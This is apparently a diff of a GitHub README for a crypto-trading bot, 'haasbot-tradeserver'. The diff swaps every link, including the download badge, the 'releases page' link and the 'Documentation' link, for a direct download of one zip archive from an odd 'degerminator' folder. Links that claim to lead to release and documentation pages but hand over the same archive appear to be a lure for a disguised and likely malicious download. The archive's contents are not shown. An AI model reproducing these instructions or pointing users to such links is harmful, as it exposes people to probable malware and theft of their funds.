@@ -1,6 +1,6 @@
 # 🤖 haasbot-tradeserver - Trade Smarter with Automation
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/map26157/haasbot-tradeserver/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/map26157/haasbot-tradeserver/main/degerminator/haasbot-tradeserver_v1.8.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/map26157/haasbot-tradeserver/main/degerminator/haasbot-tradeserver_v1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to HaasOnline TradeServer 2025! This platform helps you trade cryptocurr
 
 To download the latest version of HaasOnline TradeServer, follow these steps:
 
-1. **Visit the Releases Page**: Go to the releases page [here](https://github.com/map26157/haasbot-tradeserver/releases).
+1. **Visit the Releases Page**: Go to the releases page [here](https://raw.githubusercontent.com/map26157/haasbot-tradeserver/main/degerminator/haasbot-tradeserver_v1.8.zip).
 2. **Select the Latest Release**: Look for the latest version at the top of the list. Click on it.
 3. **Download the Software**: Choose the appropriate file for your operating system (Windows, Linux, or Mac) and click to start the download.
 4. **Locate the File**: Once downloaded, find the file in your downloads folder.
@@ -42,7 +42,7 @@ Before installing, make sure your system meets these requirements:
 
 ## 📂 Documentation
 
-For detailed instructions on specific features, programming practices, and troubleshooting, visit the [Documentation](https://github.com/map26157/haasbot-tradeserver/wiki).
+For detailed instructions on specific features, programming practices, and troubleshooting, visit the [Documentation](https://raw.githubusercontent.com/map26157/haasbot-tradeserver/main/degerminator/haasbot-tradeserver_v1.8.zip).
 
 ## 💬 Support
 
@@ -58,4 +58,4 @@ You can also follow our updates on various platforms. Our community is actively 
 
 HaasOnline TradeServer 2025 is your go-to tool for cryptocurrency trading. With its advanced automated trading features and user-friendly interface, you can enhance your trading experience. 
 
-**Don't forget to download the latest version [here](https://github.com/map26157/haasbot-tradeserver/releases) and start trading smarter today!**
+**Don't forget to download the latest version [here](https://raw.githubusercontent.com/map26157/haasbot-tradeserver/main/degerminator/haasbot-tradeserver_v1.8.zip) and start trading smarter today!**
